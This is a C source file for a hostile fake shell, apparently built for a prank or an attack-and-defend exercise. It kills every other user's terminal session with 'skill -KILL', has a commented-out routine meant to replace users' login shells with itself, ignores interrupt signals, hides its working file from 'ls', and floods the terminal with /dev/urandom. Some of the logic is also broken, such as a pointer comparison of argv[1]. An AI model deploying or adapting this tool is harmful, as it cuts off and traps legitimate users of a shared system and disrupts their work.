/*
 *By: Russell Babarsky
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

//Used to ignore signals
static volatile int keepRunning = 1;

/*
 * Ignores All signals given by the User
 */
void ignore(int sig){
	keepRunning = 0;
}
/*
 * kills all sessions except ours. Forces them to reopen a shell or reconnect
 */
void killSessions(){
	char buff[100];
	char bufftwo[100];

	FILE *reader =	fopen("youcantseememytimeisnow","w+");
	//grabs all the other sessions besides ares so we can kill them
	system("w | awk '/tty/ || /pts/' | awk '{print $2}' | grep -v $(ps ax | grep $$ | awk 'FNR == 1 {print $2}') > youcantseememytimeisnow");
	
	//reads the file with all the sessions and kills them :)
	while(fgets(buff,sizeof(buff),reader) != NULL){
	//	printf("%s",buff);
		snprintf(bufftwo,sizeof(bufftwo),"skill -KILL -t %s",buff);
		system(bufftwo);
	}
	fclose(reader);

}

/*
 * replaces all the login shells with this shell
 */
void replaceLogin(){
	system("cat test123 | awk -F: 'BEGIN { OFS=FS }$7=\"/home/user/shell false\" {print > \"/dev/null\"}'");	
}

/*
 * Main program that runs the actual shell
 */
int main(int argc, char *argv[]){
	char str[100];
	char invalid[30] = "echo 'test123'";
	char *token;

	if(argc == 1){
		fprintf(stderr,"Usage: ./shell [option] \nShould be run with true or false as option. true if run manually, false if run in shell\n");
		return -1;
	}

	if(argv[1] == "true"){
		killSessions();
		//replcaeLogin();
	}
	
	signal(SIGTSTP,ignore);
	signal(SIGINT, ignore);
	for(;;){
		printf("> ");

		if(fgets(str, sizeof(str),stdin) == NULL){

		}
		strtok(str,"\n");
		token = strtok(str, " ");
	
	//	printf("%s",token);	

		if(str[0] == '\n'){
			system(invalid);
		}else if(strcmp(token,"ls") == 0){
			system("ls | grep -v youcantseememytimeisnow");
		}else if(strcmp(str,"exit") == 0){
			return 0;
		}else if(strcmp(token,"cat") == 0){
			printf("catting urandom");
			system("cat /dev/urandom");
		}
		else{
			
			printf("Invalid Command\n");
		}
	}
}

